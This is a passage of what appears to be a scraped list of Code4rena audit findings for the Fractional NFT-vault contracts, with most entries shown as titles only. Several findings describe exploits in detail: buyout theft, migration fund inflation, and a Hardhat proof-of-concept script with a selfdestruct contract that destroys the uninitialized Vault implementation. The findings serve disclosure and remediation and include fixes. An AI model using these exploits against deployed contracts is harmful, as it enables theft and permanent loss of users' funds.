### Description  The `end` function in the `Buyout` contract uses `IERC1155(token).balanceOf(address(this), id)` to determine the amount of deposited fraction tokens without distinguishing whether those fraction tokens are depositied by the `sellFractions` function or by direct transferring. Note that only the `sellFractions` function is constrained by `PROPOSAL_PERIOD`.  This vulnerability lets a 51-holder gain the whole batch of NFTs without paying for the rest 49\\% fractions.  Assume a vault X creates 100 fraction tokens and the market-decided price of a fraction token is 1 ether (i.e., the ideal value of the locked NFTs in vault X is 100 ether). Let's also assume that Alice holds 51 tokens (maybe by paying 51 ether on opensea).  Followings are two scenarios, where the benign one follows the normal workflow and the malicious one exploits the vulnerability.  ### Benign Scenario  + Alice starts a buyout by depositing her 51 fraction tokens and 49 ether, making the `fractionPrice` 1 ether + Other users are satisfied with the provided price, and hence no one buys or sells their fraction tokens + The buyout succeeds:     + Alice gets the locked NFTs     + Other fraction holders can invoke `cash` to redeem their fraction tokens with a price of 1 ether + As a result, Alice paid 100 ether in total to get the locked NFTs.   ### Malicious Scenario  + Alice starts a buyout by depositing 0 fraction tokens and 1 wei, making the `fractionPrice` 0.01 wei.     + Note that Alice can create a separated account whose balance for the fraction token is 0, to start the buyout + No one is satisfied with the price (0.01 wei v/s 1 ether) and hence they will try to buy fraction tokens to reject the buyout     + Since there is not any fraction tokens locked in the `Buyout` contract from Alice, other users do not need to do anything + Alice invokes the `end` function     + But before invoking the `end` function, __Alice directly invokes `IERC1155(token).safeTransferFrom` to send the rest 51 fraction token to the `Buyout` contract__     + The `end` function will treat the buyout successful, since the `IERC1155(token).balanceOf(address(this), id)` is bigger than 50\\%     + The above two message calls happen in a single transaction, hence no one can front-run + As a result     + __Alice only paid 51 ether to get the locked NFTs whose value is 100 ether__     + __Other fraction holders get nothing (but they had paid for the fraction token before)__  In short, a malicious users can buy any NFT by just paying half of the NFT's market price  ### Suggested Fix  For each buyout, add a new field to record the amount of fraction tokens deposited by `sellFractions`. And in the `end` function, use the newly-added field to determine whether the buyout can be processed or not.  "}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-07-fractional-findings/issues/273", "labels": ["bug", "QA (Quality Assurance)", "sponsor acknowledged"], "target": "2022-07-fractional-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-07-fractional-findings/issues/272", "labels": ["bug", "G (Gas Optimization)", "sponsor acknowledged"], "target": "2022-07-fractional-findings", "body": "Gas Optimizations"}, {"title": "A VAULT OWNER CAN FRONTRUN A PLUGIN CALL AND CHANGE ITS IMPLEMENTATION", "html_url": "https://github.com/code-423n4/2022-07-fractional-findings/issues/267", "labels": ["bug", "duplicate", "2 (Med Risk)"], "target": "2022-07-fractional-findings", "body": "A VAULT OWNER CAN FRONTRUN A PLUGIN CALL AND CHANGE ITS IMPLEMENTATION"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-07-fractional-findings/issues/263", "labels": ["bug", "QA (Quality Assurance)", "sponsor disputed"], "target": "2022-07-fractional-findings", "body": "QA Report"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-07-fractional-findings/issues/262", "labels": ["bug", "QA (Quality Assurance)", "sponsor disputed"], "target": "2022-07-fractional-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-07-fractional-findings/issues/261", "labels": ["bug", "G (Gas Optimization)", "sponsor acknowledged"], "target": "2022-07-fractional-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-07-fractional-findings/issues/252", "labels": ["bug", "QA (Quality Assurance)", "sponsor acknowledged"], "target": "2022-07-fractional-findings", "body": "QA Report"}, {"title": "Migration.join() and Migration.leave() can still work after unsucessful migration.", "html_url": "https://github.com/code-423n4/2022-07-fractional-findings/issues/250", "labels": ["bug", "2 (Med Risk)", "sponsor confirmed"], "target": "2022-07-fractional-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/Migration.sol#L105 https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/Migration.sol#L141   # Vulnerability details  ## Impact Migration.join() and Migration.leave() can still work after unsucessful migration. As I submitted with my high-risk finding \"Migration.withdrawContribution() might work unexpectedly after unsuccessful migration.\", withdraw logic after unsuccessful migration is different from the initial leave() logic and the withdrawal logic would be messy if users call join() and leave() after unsuccessful migration.   ## Proof of Concept According to the [explanation](https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/Migration.sol#L23), join() and leave() functions must be called for 7 days before commition.  Currently, such a scenario is possible.  - Alice creates a new migration and commits after some joins. - The migration ended unsuccessfully after 4 days. - Then users can call leave() or withdrawContribution() to withdraw their deposits but it wouldn't work properly because we should recalculate eth/fractional amounts with returned amounts after unsuccessful migration.   ## Tools Used Solidity Visual Developer of VSCode   ## Recommended Mitigation Steps We should add some restrictions to join() and leave() functions so that users can call these functions for 7 days before the migration is committed.  We should add these conditions to [join()](https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/Migration.sol#L118) and [leave()](https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/Migration.sol#L150).  ``` require(!migrationInfo[_vault][_proposalId].isCommited, \"committed already\"); require(block.timestamp <= proposal.startTime + PROPOSAL_PERIOD, \"proposal over\"); ```  "}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-07-fractional-findings/issues/241", "labels": ["bug", "G (Gas Optimization)", "sponsor acknowledged", "old-submission-method"], "target": "2022-07-fractional-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-07-fractional-findings/issues/240", "labels": ["bug", "QA (Quality Assurance)", "sponsor disputed", "old-submission-method"], "target": "2022-07-fractional-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-07-fractional-findings/issues/232", "labels": ["bug", "G (Gas Optimization)", "sponsor acknowledged"], "target": "2022-07-fractional-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-07-fractional-findings/issues/231", "labels": ["bug", "QA (Quality Assurance)", "sponsor acknowledged"], "target": "2022-07-fractional-findings", "body": "QA Report"}, {"title": "Fund will be stuck if a buyout is started while there are pending migration proposals", "html_url": "https://github.com/code-423n4/2022-07-fractional-findings/issues/230", "labels": ["bug", "3 (High Risk)"], "target": "2022-07-fractional-findings", "body": "Fund will be stuck if a buyout is started while there are pending migration proposals"}, {"title": "`BaseVault.deployVault()` fails when `_modules.length` * `leaves.length > 6`", "html_url": "https://github.com/code-423n4/2022-07-fractional-findings/issues/224", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-07-fractional-findings", "body": "`BaseVault.deployVault()` fails when `_modules.length` * `leaves.length > 6`"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-07-fractional-findings/issues/221", "labels": ["bug", "QA (Quality Assurance)", "sponsor acknowledged"], "target": "2022-07-fractional-findings", "body": "QA Report"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-07-fractional-findings/issues/216", "labels": ["bug", "QA (Quality Assurance)", "sponsor disputed"], "target": "2022-07-fractional-findings", "body": "QA Report"}, {"title": "Forced buyouts can be performed by malicious buyers", "html_url": "https://github.com/code-423n4/2022-07-fractional-findings/issues/212", "labels": ["bug", "3 (High Risk)", "sponsor confirmed"], "target": "2022-07-fractional-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/Buyout.sol#L224-L238   # Vulnerability details  ## Impact In the end function of the Buyout contract, when the buyout fails, ERC1155 tokens are sent to the proposer. A malicious proposer can start a buyout using a contract that cannot receive ERC1155 tokens, and if the buyout fails, the end function fails because it cannot send ERC1155 tokens to the proposer. This prevents a new buyout from being started. ## Proof of Concept https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/Buyout.sol#L224-L238 ## Tools Used None ## Recommended Mitigation Steps Consider saving the status of the proposer after a failed buyout and implementing functions to allow the proposer to withdraw the ERC1155 tokens and eth  "}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-07-fractional-findings/issues/209", "labels": ["bug", "QA (Quality Assurance)", "sponsor disputed"], "target": "2022-07-fractional-findings", "body": "QA Report"}, {"title": "An attacker can DoS vault's buyout with as little as 1 wei per 4 days", "html_url": "https://github.com/code-423n4/2022-07-fractional-findings/issues/204", "labels": ["bug", "2 (Med Risk)"], "target": "2022-07-fractional-findings", "body": "An attacker can DoS vault's buyout with as little as 1 wei per 4 days"}, {"title": "Vault implementation can be destroyed leading to loss of all assets", "html_url": "https://github.com/code-423n4/2022-07-fractional-findings/issues/200", "labels": ["bug", "3 (High Risk)", "sponsor confirmed"], "target": "2022-07-fractional-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/VaultFactory.sol#L19-L22 https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/Vault.sol#L11-L25   # Vulnerability details   This is a basic uninitialized proxy bug, the `VaultFactory` creates a single implementation of `Vault` and then creates a proxy to that implementation every time a new vault needs to be deployed.  The problem is that that implementation vault is not initialized , which means that anybody can initialize the contract to become the owner, and then destroy it by doing a delegate call (via the `execute` function) to a function with the `selfdestruct` opcode. Once the implementation is destroyed all of the vaults will be unusable. And since there's no logic in the proxies to update the implementation - that means this is permanent (i.e. there's no way to call any function on any vault anymore, they're simply dead).  ## Impact This is a critical bug, since ALL assets held by ALL vaults will be lost. There's no way to transfer them out and there's no way to run any function on any vault.  Also, there's no way to fix the current deployed contracts (modules and registry), since they all depend on the factory vault, and there's no way to update them to a different factory. That means Fractional would have to deploy a new set of contracts after fixing the bug (this is a relatively small issue though).  ## Proof of Concept  I created the PoC based on the `scripts/deploy.js` file, here's a stripped-down version of that:  ```javascript const { ethers } = require(\"hardhat\");  const ZERO_ADDRESS = \"0x0000000000000000000000000000000000000000\";  async function main() {     const [deployer, attacker] = await ethers.getSigners();      // Get all contract factories     const BaseVault = await ethers.getContractFactory(\"BaseVault\");     const Supply = await ethers.getContractFactory(\"Supply\");     const VaultRegistry = await ethers.getContractFactory(\"VaultRegistry\");      // Deploy contracts      const registry = await VaultRegistry.deploy();     await registry.deployed();      const supply = await Supply.deploy(registry.address);     await supply.deployed();      // notice that the `factory` var in the original `deploy.js` file is a different factory than the registry's     const registryVaultFactory = await ethers.getContractAt(\"VaultFactory\", await registry.factory());      const implVaultAddress = await registryVaultFactory.implementation();     const vaultImpl = await ethers.getContractAt(\"Vault\", implVaultAddress);      const baseVault = await BaseVault.deploy(registry.address, supply.address);     await baseVault.deployed();     // proxy vault - the vault that's used by the user     let proxyVault = await deployVault(baseVault, registry, attacker);      const destructorFactory = await ethers.getContractFactory(\"Destructor\");     const destructor = await destructorFactory.deploy();       let destructData = destructor.interface.encodeFunctionData(\"destruct\", [attacker.address]);      const abi = new ethers.utils.AbiCoder();     const leafData = abi.encode([\"address\", \"address\", \"bytes4\"],         [attacker.address, destructor.address, destructor.interface.getSighash(\"destruct\")]);     const leafHash = ethers.utils.keccak256(leafData);      await vaultImpl.connect(attacker).init();      await vaultImpl.connect(attacker).setMerkleRoot(leafHash);     // we don't really need to do this ownership-transfer, because the contract is still usable till the end of the tx, but I'm doing it just in case     await vaultImpl.connect(attacker).transferOwnership(ZERO_ADDRESS);      // before: everything is fine     let implVaultCode = await ethers.provider.getCode(implVaultAddress);     console.log(\"Impl Vault code size before:\", implVaultCode.length - 2); // -2 for the 0x prefix     let owner = await proxyVault.owner();     console.log(\"Proxy Vault works fine, owner is: \", owner);       await vaultImpl.connect(attacker).execute(destructor.address, destructData, []);       // after: vault implementation is destructed     implVaultCode = await ethers.provider.getCode(implVaultAddress);     console.log(\"\\nVault code size after:\", implVaultCode.length - 2); // -2 for the 0x prefix      try {         owner = await proxyVault.owner();     } catch (e) {         console.log(\"Proxy Vault isn't working anymore.\", e.toString().substring(0, 300));     } }  async function deployVault(baseVault, registry, attacker) {     const nodes = await baseVault.getLeafNodes();      const tx = await registry.connect(attacker).create(nodes[0], [], []);     const receipt = await tx.wait();      const vaultEvent = receipt.events.find(e => e.address == registry.address);      const newVaultAddress = vaultEvent.args._vault;     const newVault = await ethers.getContractAt(\"Vault\", newVaultAddress);     return newVault; }   if (require.main === module) {     main() } ```  `Destructor.sol` file:  ```solidity // SPDX-License-Identifier: MIT pragma solidity 0.8.13;  contract Destructor{     function destruct(address payable dst) public {         selfdestruct(dst);     } } ```  Output: ``` Impl Vault code size before: 10386 Proxy Vault works fine, owner is:  0x5FbDB2315678afecb367f032d93F642f64180aa3  Vault code size after: 0 Proxy Vault isn't working anymore. Error: call revert exception [ See: https://links.ethers.org/v5-errors-CALL_EXCEPTION ] (method=\"owner()\", data=\"0x\", errorArgs=null, errorName=null, errorSignature=null, reason=null, code=CALL_EXCEPTION, version=abi/5.6.2) ```  Sidenote: as the comment in the code says, we don't really need to transfer the ownership to the zero address. It's just that Foundry's `forge` did revert the destruction when I didn't do it, with the error of `OwnerChanged` (i.e. once the `selfdestruct` was called the owner became the zero address, which is different than the original owner) so I decided to add this just in case. This is probably a bug in `forge`, since the contract shouldn't destruct till the end of the tx (Hardhat indeed didn't revert the destruction even when the attacker was the owner).  ## Tools Used Hardhat  ## Recommended Mitigation Steps    Add init in `Vault`'s constructor (and make the `init` function `public` instead of `external`):  ```solidity contract Vault is IVault, NFTReceiver {     /// @notice Address of vault owner     address public owner;     /// ...      constructor(){         // initialize implementation         init();     }      /// @dev Initializes nonce and proxy owner     function init() public {  ```  Alternately you can add init in `VaultFactory.sol` constructor, but I think initializing in the contract itself is a better practice.  ```solidity     /// @notice Initializes implementation contract     constructor() {         implementation = address(new Vault());         Vault(implementation).init();     }  ```    After mitigation the PoC will output this:  ``` Error: VM Exception while processing transaction: reverted with custom error 'Initialized(\"0xa16E02E87b7454126E5E10d957A927A7F5B5d2be\", \"0x70997970C51812dc3A010C7d01b50e0d17dc79C8\", 1)'     at Vault._execute (src/Vault.sol:124)     at Vault.init (src/Vault.sol:24)     at HardhatNode._mineBlockWithPendingTxs     .... ```  "}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-07-fractional-findings/issues/198", "labels": ["bug", "QA (Quality Assurance)", "sponsor disputed"], "target": "2022-07-fractional-findings", "body": "QA Report"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-07-fractional-findings/issues/194", "labels": ["bug", "QA (Quality Assurance)", "sponsor disputed"], "target": "2022-07-fractional-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-07-fractional-findings/issues/193", "labels": ["bug", "G (Gas Optimization)", "sponsor acknowledged"], "target": "2022-07-fractional-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-07-fractional-findings/issues/191", "labels": ["bug", "G (Gas Optimization)", "sponsor acknowledged"], "target": "2022-07-fractional-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-07-fractional-findings/issues/190", "labels": ["bug", "G (Gas Optimization)", "sponsor acknowledged"], "target": "2022-07-fractional-findings", "body": "Gas Optimizations"}, {"title": "Any fractions deposited into any proposal can be stolen at any time until it is commited", "html_url": "https://github.com/code-423n4/2022-07-fractional-findings/issues/183", "labels": ["bug", "3 (High Risk)"], "target": "2022-07-fractional-findings", "body": "Any fractions deposited into any proposal can be stolen at any time until it is commited"}, {"title": "Proposal which started buyout which fails is able to settle migration as if its buyout succeeded.", "html_url": "https://github.com/code-423n4/2022-07-fractional-findings/issues/182", "labels": ["bug", "3 (High Risk)"], "target": "2022-07-fractional-findings", "body": "Proposal which started buyout which fails is able to settle migration as if its buyout succeeded."}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-07-fractional-findings/issues/174", "labels": ["bug", "QA (Quality Assurance)", "sponsor acknowledged"], "target": "2022-07-fractional-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-07-fractional-findings/issues/173", "labels": ["bug", "G (Gas Optimization)", "sponsor acknowledged"], "target": "2022-07-fractional-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-07-fractional-findings/issues/170", "labels": ["bug", "G (Gas Optimization)", "sponsor acknowledged"], "target": "2022-07-fractional-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-07-fractional-findings/issues/169", "labels": ["bug", "QA (Quality Assurance)", "sponsor confirmed"], "target": "2022-07-fractional-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-07-fractional-findings/issues/168", "labels": ["bug", "G (Gas Optimization)", "sponsor acknowledged"], "target": "2022-07-fractional-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-07-fractional-findings/issues/167", "labels": ["bug", "QA (Quality Assurance)", "sponsor disputed"], "target": "2022-07-fractional-findings", "body": "QA Report"}, {"title": "A VAULT OWNER CAN BE ALSO THE CONTROLLER AND ARBITRARILY SET THE SECONDARY MARKET ROYALTIES", "html_url": "https://github.com/code-423n4/2022-07-fractional-findings/issues/166", "labels": ["bug", "2 (Med Risk)", "disagree with severity"], "target": "2022-07-fractional-findings", "body": "A VAULT OWNER CAN BE ALSO THE CONTROLLER AND ARBITRARILY SET THE SECONDARY MARKET ROYALTIES"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-07-fractional-findings/issues/163", "labels": ["bug", "QA (Quality Assurance)", "sponsor acknowledged"], "target": "2022-07-fractional-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-07-fractional-findings/issues/162", "labels": ["bug", "G (Gas Optimization)", "sponsor acknowledged"], "target": "2022-07-fractional-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-07-fractional-findings/issues/158", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed"], "target": "2022-07-fractional-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-07-fractional-findings/issues/157", "labels": ["bug", "QA (Quality Assurance)", "sponsor disputed"], "target": "2022-07-fractional-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-07-fractional-findings/issues/156", "labels": ["bug", "G (Gas Optimization)", "sponsor acknowledged"], "target": "2022-07-fractional-findings", "body": "Gas Optimizations"}, {"title": "Migration fails when all tokens are joined", "html_url": "https://github.com/code-423n4/2022-07-fractional-findings/issues/155", "labels": ["bug", "2 (Med Risk)", "sponsor confirmed"], "target": "2022-07-fractional-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-07-fractional/blob/f862c14f86adf7de232cd4e9cca6b611e6023b98/src/modules/Migration.sol#L202 https://github.com/code-423n4/2022-07-fractional/blob/f862c14f86adf7de232cd4e9cca6b611e6023b98/src/modules/Migration.sol#L528   # Vulnerability details  ## Impact When `proposal.totalFractions` is equal to the total supply (meaning that all token holders want to participate in a migration), there is a division by zero in `_calculateTotal`.  In contrast to a buyout, where it does not make sense to initiate a buyout if all tokens are held (because there is a dedicated method for that), it does make sense to have a migration that all token holders join. Therefore, this case should be handled.  ## Proof Of Concept ```diff --- a/test/Migration.t.sol +++ b/test/Migration.t.sol @@ -238,7 +238,7 @@ contract MigrationTest is TestUtil {          // Bob joins the proposal          bob.migrationModule.join{value: 1 ether}(vault, 1, HALF_SUPPLY);          // Alice joins the proposal -        alice.migrationModule.join{value: 1 ether}(vault, 1, 1000); +        alice.migrationModule.join{value: 1 ether}(vault, 1, HALF_SUPPLY);           vm.warp(proposalPeriod + 1);          // bob calls commit to kickoff the buyout process ```  ## Recommended Mitigation Steps In such a case, `redeem` can be used instead of starting a buyout.  "}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-07-fractional-findings/issues/144", "labels": ["bug", "G (Gas Optimization)", "sponsor acknowledged"], "target": "2022-07-fractional-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-07-fractional-findings/issues/143", "labels": ["bug", "QA (Quality Assurance)", "sponsor confirmed"], "target": "2022-07-fractional-findings", "body": "QA Report"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-07-fractional-findings/issues/141", "labels": ["bug", "QA (Quality Assurance)", "sponsor acknowledged"], "target": "2022-07-fractional-findings", "body": "QA Report"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-07-fractional-findings/issues/140", "labels": ["bug", "QA (Quality Assurance)", "sponsor disputed"], "target": "2022-07-fractional-findings", "body": "QA Report"}, {"title": "Users can lose fractions to precision loss during migraction if _newFractionSupply is set very low", "html_url": "https://github.com/code-423n4/2022-07-fractional-findings/issues/137", "labels": ["bug", "3 (High Risk)", "sponsor confirmed"], "target": "2022-07-fractional-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/Migration.sol#L72-L99   # Vulnerability details  # Vulnerability details  ## Impact Precision loss causing loss of user value and potentially cause complete loss to vault  ## Proof of Concept https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/Migration.sol#L471-L472  If the supply of the fraction is set to say 10 then any user that uses migrateFractions with less than 10% of the contributions will receive no shares at all due to precision loss. Under certain conditions it may even cause complete loss of access to the vault. In this same example, if less than 5 fractions can be redeemed (i.e. not enough people have more than 10% to overcome the precision loss) then the vault would never be able to be bought out and the vault would forever be frozen.  ## Tools Used  ## Recommended Mitigation Steps When calling propose require that _newFractionSupply is greater than some value (i.e. 1E18)  "}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-07-fractional-findings/issues/130", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed"], "target": "2022-07-fractional-findings", "body": "Gas Optimizations"}, {"title": "Failed proposal can be committed again", "html_url": "https://github.com/code-423n4/2022-07-fractional-findings/issues/124", "labels": ["bug", "3 (High Risk)"], "target": "2022-07-fractional-findings", "body": "Failed proposal can be committed again"}, {"title": "Migration can permanently fail if user specifies different lengths for `selectors` and `plugins`", "html_url": "https://github.com/code-423n4/2022-07-fractional-findings/issues/115", "labels": ["bug", "3 (High Risk)", "sponsor confirmed"], "target": "2022-07-fractional-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/Vault.sol#L73-L82 https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/Migration.sol#L72-L99 https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/VaultRegistry.sol#L174   # Vulnerability details  ## Impact In `propose()` in Migration.sol, there is no check that the lengths of the `selectors` and `plugins` arrays are the same. This means that if a migration is successful, the `install()` function in Vault.sol could revert beacuse we access an array out of bounds. This prevents a new vault being created thereby permanently locking assets inside the vault.  ## Proof of Concept 1. user starts a new migration proposal where `selectors.length != plugins.length` 2. enough users join proposal and the buyout bid starts 3. buyout bid is successful and migration starts with `settleVault()` 4. a new vault is cloned with `create()` -> `registry.deployFor()` -> `vault.install(selectors, plugins)` 5. a. If `selectors.length > plugins.length` then we get an out of bounds error and transaction reverts     b. If `selectors.length < plugins.length` then the excess values in `plugins` is ignored which is tolerable 6. In scenario a., the migration fails and a new migration cannot start so assets in the vault are permanently locked  This may seem quite circumstantial as this problem only occurs if a user specifies `selectors` and `plugins` wrongly however it is very easy for an attacker to perform this maliciously with no cost on their behalf, it is highly unlikely that users will be able to spot a malicious migration.  ## Tools Used VS Code ## Recommended Mitigation Steps Consider adding a check in `propose()` to make sure that the lengths match i.e. ```solidity function propose(         address _vault,         address[] calldata _modules,         address[] calldata _plugins,         bytes4[] calldata _selectors,         uint256 _newFractionSupply,         uint256 _targetPrice     ) external {         // @Audit Make sure that selectors and plugins match         require(_selectors.length == _plugins.length, \"Plugin lengths do not match\");         // Reverts if address is not a registered vault         (, uint256 id) = IVaultRegistry(registry).vaultToToken(_vault);         if (id == 0) revert NotVault(_vault);         // Reverts if buyout state is not inactive         (, , State current, , , ) = IBuyout(buyout).buyoutInfo(_vault);         State required = State.INACTIVE;         if (current != required) revert IBuyout.InvalidState(required, current);          // Initializes migration proposal info         Proposal storage proposal = migrationInfo[_vault][++nextId];         proposal.startTime = block.timestamp;         proposal.targetPrice = _targetPrice;         proposal.modules = _modules;         proposal.plugins = _plugins;         proposal.selectors = _selectors;         proposal.oldFractionSupply = IVaultRegistry(registry).totalSupply(             _vault         );         proposal.newFractionSupply = _newFractionSupply;     } ```  Additionally, I would suggest adding such a check in the `install()` function as this may prevent similiar problems if new modules are added  "}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-07-fractional-findings/issues/111", "labels": ["bug", "G (Gas Optimization)", "sponsor acknowledged", "old-submission-method"], "target": "2022-07-fractional-findings", "body": "Gas Optimizations"}, {"title": "USE SAFETRANSFERFROM INSTEAD OF TRANSFERFROM FOR ERC720 TRANSFERS", "html_url": "https://github.com/code-423n4/2022-07-fractional-findings/issues/98", "labels": ["bug", "QA (Quality Assurance)", "sponsor disputed"], "target": "2022-07-fractional-findings", "body": "USE SAFETRANSFERFROM INSTEAD OF TRANSFERFROM FOR ERC720 TRANSFERS"}, {"title": "Empty receive function can cause loss of funds", "html_url": "https://github.com/code-423n4/2022-07-fractional-findings/issues/84", "labels": ["bug", "QA (Quality Assurance)", "sponsor disputed"], "target": "2022-07-fractional-findings", "body": "Empty receive function can cause loss of funds"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-07-fractional-findings/issues/78", "labels": ["bug", "QA (Quality Assurance)", "sponsor acknowledged"], "target": "2022-07-fractional-findings", "body": "QA Report"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-07-fractional-findings/issues/72", "labels": ["bug", "QA (Quality Assurance)", "sponsor confirmed"], "target": "2022-07-fractional-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-07-fractional-findings/issues/65", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed"], "target": "2022-07-fractional-findings", "body": "Gas Optimizations"}, {"title": "Batch transfers should check that input arrays are same length", "html_url": "https://github.com/code-423n4/2022-07-fractional-findings/issues/61", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-07-fractional-findings", "body": "Batch transfers should check that input arrays are same length"}, {"title": "`fallback()` function can bypass permission/auth checks imposed in `execute()`", "html_url": "https://github.com/code-423n4/2022-07-fractional-findings/issues/47", "labels": ["bug", "2 (Med Risk)"], "target": "2022-07-fractional-findings", "body": "`fallback()` function can bypass permission/auth checks imposed in `execute()`"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-07-fractional-findings/issues/33", "labels": ["bug", "QA (Quality Assurance)", "sponsor acknowledged"], "target": "2022-07-fractional-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-07-fractional-findings/issues/32", "labels": ["bug", "G (Gas Optimization)", "sponsor acknowledged"], "target": "2022-07-fractional-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-07-fractional-findings/issues/30", "labels": ["bug", "QA (Quality Assurance)", "sponsor disputed"], "target": "2022-07-fractional-findings", "body": "QA Report"}, {"title": "Steal NFTs from a Vault, and ETH + Fractional tokens from users.", "html_url": "https://github.com/code-423n4/2022-07-fractional-findings/issues/27", "labels": ["bug", "3 (High Risk)", "sponsor confirmed"], "target": "2022-07-fractional-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/modules/Migration.sol#L292   # Vulnerability details  ## Impact Steal NFTs from a Vault, and ETH + Fractional tokens from users.  ## Description  The `Migration.sol` module expects users to join a proposal using the `join` function, and leave a proposal using the `leave` function, both functions update fraction and ether balances of the proposal *and* the caller.  The `withdrawContribution` function is meant to be used to retrieve ether and fractions deposited from an unsuccessful migration, but it can be called as well in proposals that have not been commited.  Unfortunately, the `withdrawContribution` function will issue a refund on fraction tokens and ether balances the user sent to a proposal but it will not update the variables `totalEth` and `totalFractions` (as `join` and `leave` do), leading to an inflation of ETH and fractional tokens if the user calls `join`, `withdrawContribution` and `join` again.  Exploiting this inflation bug, an attacker can steal all Ether and fractional tokens sent to a legit proposal by legit users of the community, and redirect them to an evil proposal that will win (because it has over 51% of token supply) and at the same time invalidate the legit proposal due to:  1- Lack of funds (they were stolen).  2- Only 1 LIVE proposal can be running at the same time.  A key element to take note is that only 1 proposal can be `LIVE`, but before a proposal goes `LIVE`, many can be created at the same time, and users can join those that resonate with them, sending their ETH and fractional tokens to support it. The vault will have a big amount of ETH and fractional tokens in these situations.  ## Steps to reproduce An attacker's will exploit the inflation bug as follow:  1- Wait until there's at least 50% of the total supply of fractional tokens in the vault, being stacked into one or several proposals.  2- Create an evil proposal with evil modules and inflate the amount of ETH and fractional tokens in your proposal up to the exact amount of the total ETH and fractional tokens in the vault.  3- Commit your proposal. That will send all ETH and fractional tokens in the vault to your proposal and `start` it.  Now that your proposal has over 51% total supply of fractional tokens in it and a lot of ETH stolen from members of the vault, many creative things 